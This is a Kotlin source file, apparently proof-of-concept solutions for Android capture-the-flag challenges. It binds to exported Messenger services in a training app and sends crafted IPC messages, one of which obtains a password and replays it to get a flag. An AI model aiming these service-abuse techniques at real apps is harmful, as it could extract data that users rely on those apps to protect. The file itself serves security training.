package com.vishal2376.hextreepoc

import android.content.ComponentName
import android.content.ServiceConnection
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.Message
import android.os.Messenger

/**
 * Author: Vishal Singh (vishal2376)
 */

object Flag26Service {

	private var mainMessenger: Messenger? = null

	val serviceConnection = object : ServiceConnection {
		override fun onServiceConnected(
			name: ComponentName?,
			service: IBinder?,
		) {
			val mainMessenger = Messenger(service)
			val msg = Message.obtain(null, 42)
			mainMessenger.send(msg)
		}

		override fun onServiceDisconnected(name: ComponentName?) {
			mainMessenger = null
		}

	}
}

object Flag27Service {

	private const val MSG_ECHO = 1
	private const val MSG_GET_PASSWORD = 2
	private const val MSG_GET_FLAG = 3

	private var mainMessenger: Messenger? = null

	private val messageHandler = object : Handler(Looper.getMainLooper()) {
		override fun handleMessage(msg: Message) {
			val password = msg.data?.getString("password") ?: return

			val msg3 = Message.obtain(null, MSG_GET_FLAG).apply {
				data = Bundle().apply { putString("password", password) }
				replyTo = Messenger(Handler(Looper.getMainLooper()))
			}
			mainMessenger?.send(msg3)
		}
	}

	val serviceConnection = object : ServiceConnection {
		override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
			mainMessenger = Messenger(service)

			val msg1 = Message.obtain(null, MSG_ECHO).apply {
				data = Bundle().apply { putString("echo", "give flag") }
			}
			mainMessenger?.send(msg1)

			val msg2 = Message.obtain(null, MSG_GET_PASSWORD).apply {
				obj = Bundle()
				replyTo = Messenger(messageHandler)
			}
			mainMessenger?.send(msg2)
		}

		override fun onServiceDisconnected(name: ComponentName?) {
			mainMessenger = null
		}
	}
}